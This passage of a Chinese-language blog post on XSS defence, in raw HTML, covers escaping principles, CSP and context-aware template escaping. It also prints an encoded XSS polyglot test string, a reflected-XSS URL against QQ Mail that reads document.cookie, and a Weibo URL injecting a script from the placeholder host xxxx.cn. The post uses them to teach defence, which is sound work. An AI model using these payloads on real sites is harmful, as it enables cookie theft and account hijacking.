operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">**</span><span class="token operator">%</span><span class="token number">2</span><span class="token function">F</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">2</span>FoNcliCk<span class="token operator">%</span><span class="token number">3</span><span class="token function">Dalert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">250</span>d<span class="token operator">%</span><span class="token number">250</span>a<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>FstYle<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>FtitLe<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>FteXtarEa<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>FscRipt<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">--</span><span class="token operator">!</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CsVg<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>CsVg<span class="token operator">%</span><span class="token number">2</span>FoNloAd<span class="token operator">%</span><span class="token number">3</span><span class="token function">Dalert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>E`
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。</p> <h3 id="xss攻击的总结"><a href="#xss攻击的总结" class="header-anchor">#</a> XSS攻击的总结</h3> <p>我们回到最开始提出的问题：</p> <ol><li>XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li></ol> <p>不正确。因为：<br>
防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。<br>
转义应该在输出 HTML 时进行，而不是在提交用户输入时。<br>
2. 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面了。</p> <p>不正确。<br>
不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。<br>
业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。<br>
整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p> <p>虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：</p> <p>1.利用模板引擎<br>
开启模板引擎自带的 HTML 转义功能。<br>
2.避免内联事件<br>
尽量不要使用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>onLoad<span class="token operator">=</span><span class="token string">&quot;onload('{{data}}')&quot;</span>、onClick<span class="token operator">=</span><span class="token string">&quot;go('{{action}}')&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code>事件绑定会更安全。<br>
3.避免拼接 HTML<br>
前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement、setAttribute</code>之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。<br>
4.时刻保持警惕<br>
在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。<br>
5.增加攻击难度，降低攻击后果<br>
通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。<br>
6.主动检测和发现<br>
可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</p> <h3 id="xss攻击案例"><a href="#xss攻击案例" class="header-anchor">#</a> XSS攻击案例</h3> <p>QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞<br>
攻击者发现 <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code>这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。</p> <p>于是攻击者构建出一个 URL，并引导用户去点击：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>m<span class="token punctuation">.</span>exmail<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span>cgi<span class="token operator">-</span>bin<span class="token operator">/</span>login<span class="token operator">?</span>uin<span class="token operator">=</span>aaaa<span class="token operator">&amp;</span>domain<span class="token operator">=</span>bbbb<span class="token operator">%</span><span class="token number">26</span>quot<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>Breturn<span class="token operator">+</span><span class="token boolean">false</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">26</span>quot<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">26</span>lt<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">2</span>Fscript<span class="token operator">%</span><span class="token number">26</span>gt<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">26</span>lt<span class="token operator">%</span><span class="token number">3</span>Bscript<span class="token operator">%</span><span class="token number">26</span>gt<span class="token operator">%</span><span class="token number">3</span><span class="token function">Balert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span>lt<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">2</span>Fscript<span class="token operator">%</span><span class="token number">26</span>gt<span class="token operator">%</span><span class="token number">3</span>B` 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot;</span><span class="token operator">+</span><span class="token string">&quot;&amp;t=&quot;</span><span class="token operator">+</span><span class="token string">&quot;&amp;d=bbbb&quot;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p> <p>新浪微博名人堂反射型 XSS 漏洞</p> <p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code>这个 URL 的内容未经过滤直接输出到 HTML 中。
于是攻击者构建出一个 URL，然后诱导用户去点击：</p> <p><code>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;</code></p> <p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://weibo.com/pub/star/g/xyyyd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>//xxxx.cn/image/t.js</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;&gt;按分类检索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p> <h3 id="xss攻击扩展阅读：automatic-context-aware-escaping"><a href="#xss攻击扩展阅读：automatic-context-aware-escaping" class="header-anchor">#</a> XSS攻击扩展阅读：Automatic Context-Aware Escaping</h3> <p>合适的 HTML 转义可以有效避免 XSS 漏洞。<br>
完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。<br>
业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。<br>
通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p> <p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p> <p>2009年，Google 提出了一个概念叫做：Automatic Context-Aware Escaping。</p> <p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p> <p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{{.title}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>{{.url}}<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{.content}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{{.title | htmlescaper}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>{{.url | urlescaper | attrescaper}}<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{.content | htmlescaper}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：</p> <p>go html/template<br>
Google Closure Templates</p> <h3 id="网络攻击未完待续"><a href="#网络攻击未完待续" class="header-anchor">#</a> 网络攻击未完待续</h3></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">last Updated:</span> <span class="time">7/27/2020, 11:01:27 AM</span></div></footer> <!----> </main></div><div class="global-ui"><!----></div></div>
    <script src="/blog/assets/js/app.691678be.js" defer></script><script src="/blog/assets/js/2.ba034f29.js" defer></script><script src="/blog/assets/js/87.93ed8a37.js" defer></script>
  </body>
</html>
